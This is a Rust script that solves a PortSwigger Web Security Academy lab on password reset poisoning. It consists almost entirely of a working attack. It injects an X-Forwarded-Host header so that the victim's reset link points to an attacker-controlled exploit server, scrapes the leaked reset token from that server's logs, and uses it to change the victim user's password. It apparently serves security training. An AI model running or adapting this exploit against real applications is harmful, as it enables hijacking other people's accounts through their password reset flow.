/************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 30/8/2023
*
* Lab: Password reset poisoning via middleware
*
* Steps: 1. Change the dynamically-generating link of password change
*           functionality via X-Forwarded-Host header to point to your
*           exploit server
*        2. Extract the temporary token from you server logs
*        3. Use the token to change carlos password
*
*************************************************************************/
#![allow(unused)]
#![feature(ascii_char)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    hash::Hash,
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0afb0047032e465684620f2100010005.web-security-academy.net"; // change this url to your lab
    let exploit_server_domain = "exploit-0a4800b90333461a84740e2f016000b2.exploit-server.net"; // change this url to your exploit server
    let client = build_client(); // build the client which will be used in all subsequent requests
    let new_password = "Hacked"; // change thin to what you want
    let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain); // change the dynamically-generating link via X-Forwarded-Host
    if is_changed {
        // if you changed the link successfully
        let some_token = extract_token_from_logs(&client, exploit_server_domain); // try to extract the token from the your server logs
        if let Some(token) = some_token {
            println!("{}", token);
            // if you found the token
            let password_change = change_password(&client, url, &token, new_password); // try to change the password with the obtained token
            if let Ok(res) = password_change {
                println!(
                    "{}",
                    "3. Changing the password of the carlos.. ☑️".white().bold()
                )
            }
            println!(
                "{}: {}",
                "✅ Password changed to".yellow().bold(),
                new_password.green().bold()
            );
        // decrypt the token
        } else {
            println!("{}", "No tokens found")
        }
    } else {
        println!("{}", "[!] Failed to change the dynamically generated link")
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************************
* Function used to change the dynamically-generated link
*********************************************************/
fn change_dynamically_generated_link(
    client: &Client,
    url: &str,
    exploit_server_domain: &str,
) -> bool {
    let change_link = client
        .post(&format!("{url}/forgot-password"))
        .form(&HashMap::from([("username", "carlos")]))
        .header("X-Forwarded-Host", exploit_server_domain)
        .send();
    if let Ok(res) = change_link {
        println!(
            "{}",
            "1. Change the dynamically generated link via X-Forwarded-Host header.. ☑️"
                .white()
                .bold()
        );
        true
    } else {
        false
    }
}

/*****************************************************************
* Function used to extract the token from the exploit sever logs
******************************************************************/
fn extract_token_from_logs(client: &Client, exploit_server_domain: &str) -> Option<String> {
    let pattern = Regex::new("temp-forgot-password-token=(.*) HTTP").unwrap();
    let logs = client
        .get(format!("https://{exploit_server_domain}/log"))
        .send();
    if let Ok(res) = logs {
        let body = res.text().unwrap();
        let token = pattern.captures_iter(&body);
        if let Some(text) = token.last() {
            let encrypt = text.get(1).unwrap().as_str().to_string();
            println!(
                "{}",
                "2. Get temp-forgot-password-token of the victim from exploit sever logs.. ☑️"
                    .white()
                    .bold()
            );
            return Some(encrypt);
        } else {
            None
        }
    } else {
        println!("{}", "[!] Failed to get logs through exception");
        None
    }
}

/*************************************************
* Function used to issue a change password request
**************************************************/
fn change_password(
    client: &Client,
    url: &str,
    token: &str,
    new_password: &str,
) -> Result<Response, Error> {
    client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([
            ("temp-forgot-password-token", token),
            ("new-password-1", new_password),
            ("new-password-2", new_password),
        ]))
        .send()
}
